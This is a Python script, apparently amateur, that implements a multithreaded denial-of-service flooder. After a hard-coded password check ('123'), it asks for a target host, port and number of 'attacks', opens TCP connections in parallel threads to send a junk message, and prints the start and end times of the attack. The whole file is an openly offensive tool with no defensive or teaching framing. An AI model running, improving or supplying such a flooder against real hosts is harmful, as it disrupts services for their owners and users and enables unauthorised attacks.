from datetime import datetime
import threading
import socket
import time


class Dos:
    def __init__(self, host, port, nThreads):
        self.host = host
        self.port = port
        self.nThreads = nThreads

        self.threadslist = []

        self.message = "SCHOKOLADE" + "genau so lecker wie M&Ms" + "HTTP//1.1.1.1\n\r"

    def SendAttack(self):
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            client_socket.connect((self.host, int(self.port)))
            client_socket.send(str.encode(self.message))
            client_socket.sendto(str.encode(self.message), (self.host, int(self.port)))
            print("working")
        except socket.error:
            print("error")
            pass

        client_socket.close()

    def Attack(self):
        for i in range(self.nThreads):
            t = threading.Thread(target=self.SendAttack)
            self.threadslist.append(t)

        for i in self.threadslist:
            try:
                i.start()

            except RuntimeError:
                continue

        for i in self.threadslist:
            try:
                i.join()

            except RuntimeError:
                continue


def login():
    eingabe = input("[*] Enter Password here: ")

    if eingabe == "123":
        for i in range(500):
            print(" ")

        pass

    if eingabe != "123":
        print("[!] The entered Password is wrog, try again!")
        login()


login()
host = input("\n[*] Enter target IPAdress: ")
port = int(input("\n[*] Enter target Port: "))
nThreads = int(input("\n[*] Enter number of Attacks here: "))

hostip = socket.gethostbyname(host)

Dos = Dos(host, port, nThreads)

print("\n\n[*] Host " + host + " | IPAdress " + hostip)
print("[*] Starting Attack...")

start_time_now = time.strftime("%H:%M:%S")
start_time = datetime.now()

Dos.Attack()

end_time_now = time.strftime("%H:%M:%S")
end_time = datetime.now()
total_time = end_time - start_time

try:
    print("\n\n[*] The Attack was done at " + time.strftime("%H:%M:%S"))
    print("[*] Total Attack time " + str(total_time))
    print("\n[*] The Attack started at " + start_time_now)
    print("[*] The Attack ended at " + end_time_now)

except ValueError as error:
    print("[*] The Attack was done at " + time.strftime("%H:%M:%S"))
    print("[*] Total Attack time " + str(total_time))
